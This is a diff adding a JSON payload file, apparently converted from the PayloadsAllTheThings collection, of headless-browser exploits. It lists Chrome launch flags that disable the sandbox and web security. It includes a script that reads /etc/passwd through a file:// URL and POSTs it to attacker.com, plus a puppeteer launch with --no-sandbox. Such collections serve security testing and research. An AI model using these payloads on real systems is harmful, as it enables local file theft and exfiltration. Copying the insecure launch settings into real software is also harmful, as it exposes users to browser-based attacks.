@@ -1,0 +1,32 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "headless_browser",
+  "original_category": "Headless Browser",
+  "payloads": [
+    {
+      "category": "Insecure Flags",
+      "escalation": "baseline",
+      "lines": [
+        "google-chrome-stable --disable-gpu --headless=new --no-sandbox --no-first-run --disable-web-security -–allow-file-access-from-files --allow-file-access --allow-cross-origin-auth-prompt --user-data-dir",
+        "<script>",
+        "async function getFlag(){",
+        "response = await fetch(\"file:///etc/passwd\");",
+        "flag = await response.text();",
+        "fetch(\"https://attacker.com/\", { method: \"POST\", body: flag})",
+        "};",
+        "getFlag();",
+        "</script>"
+      ]
+    },
+    {
+      "category": "CVE",
+      "escalation": "baseline",
+      "lines": [
+        "const browser = await puppeteer.launch({",
+        "args: ['--no-sandbox']",
+        "});"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.870Z"
+}
